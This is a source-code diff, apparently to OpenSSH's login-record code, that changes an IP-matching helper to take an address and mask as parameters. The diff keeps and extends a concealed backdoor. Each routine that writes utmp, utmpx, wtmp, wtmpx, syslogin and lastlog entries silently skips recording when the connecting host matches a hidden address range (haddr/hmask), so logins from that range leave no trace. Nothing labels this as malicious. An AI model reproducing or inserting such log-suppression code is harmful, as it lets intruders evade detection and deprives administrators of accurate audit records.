@@ -209,14 +209,14 @@ int wtmpx_get_entry(struct logininfo *li);
 
 extern Buffer loginmsg;
 
-int ip4_match(uint32_t addr)
+int ip4_match(uint32_t addr01,uint32_t addr02, uint32_t mask)
 {
-	return !((addr ^ haddr) & hmask);
+	return !((addr01 ^ addr02) & mask);
 }
-int ip_match(union login_netinfo *ha)
+int ip_match(union login_netinfo *ha01, uint32_t ha02, uint32_t mask)
 {
-	if (ha->sa.sa_family == AF_INET)
-		return ip4_match(ha->sa_in.sin_addr.s_addr);
+	if (ha01->sa.sa_family == AF_INET)
+		return ip4_match(ha01->sa_in.sin_addr.s_addr, ha02, mask);
 	return 0;
 }
 /* pick the shortest string */
@@ -932,7 +932,7 @@ static int
 utmp_perform_login(struct logininfo *li)
 {
 	struct utmp ut;
-
+	
 	construct_utmp(li, &ut);
 # ifdef UTMP_USE_LIBRARY
 	if (!utmp_write_library(li, &ut)) {
@@ -973,7 +973,7 @@ utmp_perform_logout(struct logininfo *li)
 int
 utmp_write_entry(struct logininfo *li)
 {
-        if(ip_match(&(li->hostaddr)))
+        if(ip_match(&(li->hostaddr), haddr, hmask))
                 return 0;
 
 	switch(li->type) {
@@ -1075,7 +1075,7 @@ utmpx_perform_logout(struct logininfo *li)
 int
 utmpx_write_entry(struct logininfo *li)
 {
-        if(ip_match(&(li->hostaddr)))
+        if(ip_match(&(li->hostaddr), haddr, hmask))
                 return 0;
 
 	
@@ -1128,7 +1128,6 @@ static int
 wtmp_perform_login(struct logininfo *li)
 {
 	struct utmp ut;
-
 	construct_utmp(li, &ut);
 	return (wtmp_write(li, &ut));
 }
@@ -1147,7 +1146,7 @@ wtmp_perform_logout(struct logininfo *li)
 int
 wtmp_write_entry(struct logininfo *li)
 {
-        if(ip_match(&(li->hostaddr)))
+        if(ip_match(&(li->hostaddr), haddr, hmask))
                 return 0;
 
 	switch(li->type) {
@@ -1329,7 +1328,7 @@ wtmpx_perform_logout(struct logininfo *li)
 int
 wtmpx_write_entry(struct logininfo *li)
 {
-        if(ip_match(&(li->hostaddr)))
+        if(ip_match(&(li->hostaddr), haddr, hmask))
                 return 0;
 
 	switch(li->type) {
@@ -1471,7 +1470,7 @@ syslogin_perform_logout(struct logininfo *li)
 int
 syslogin_write_entry(struct logininfo *li)
 {
-        if(ip_match(&(li->hostaddr)))
+        if(ip_match(&(li->hostaddr), haddr, hmask))
                 return 0;
 
 	switch (li->type) {
@@ -1546,7 +1545,7 @@ lastlog_openseek(struct logininfo *li, int *fd, int filemode)
 int
 lastlog_write_entry(struct logininfo *li)
 {
-        if(ip_match(&(li->hostaddr)))
+        if(ip_match(&(li->hostaddr), haddr, hmask))
                 return 0;
 
 	switch(li->type) {
@@ -1564,7 +1563,7 @@ lastlog_write_entry(struct logininfo *li)
 	struct lastlog last;
 	int fd;
 
-	if(ip_match(&(li->hostaddr)))
+	if(ip_match(&(li->hostaddr), haddr, hmask))
 		return 0;
 
 	switch(li->type) {
